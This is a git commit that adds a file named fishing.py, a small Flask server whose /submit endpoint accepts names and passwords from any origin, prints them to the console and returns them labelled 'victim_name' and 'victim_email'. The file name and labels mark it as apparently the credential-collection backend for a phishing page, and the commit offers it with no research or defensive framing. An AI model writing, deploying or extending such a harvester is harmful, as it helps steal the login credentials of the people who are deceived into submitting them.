37f9cd4ffc90fc7d4c4b96f263533e2223af44d6
peepushin6 <peepushin6@gmail.com>
2024-11-20 00:43:47 -0500

    latest-version

---
+++ fishing.py
@@ -0,0 +1,15 @@
+from flask import Flask , request, jsonify
+from flask_cors import CORS
+
+app = Flask(__name__)
+CORS(app)
+@app.route('/submit', methods=['POST'])
+
+def submit():
+  data = request.get_json()
+  name = data.get('name' , 'No name')
+  password = data.get('password' , 'No password')
+  print(f'Name: {name}, password: {password}')
+  return   jsonify({'victim_name': name, 'victim_email': password})
+if __name__ == '__main__':
+  app.run(port=5000)
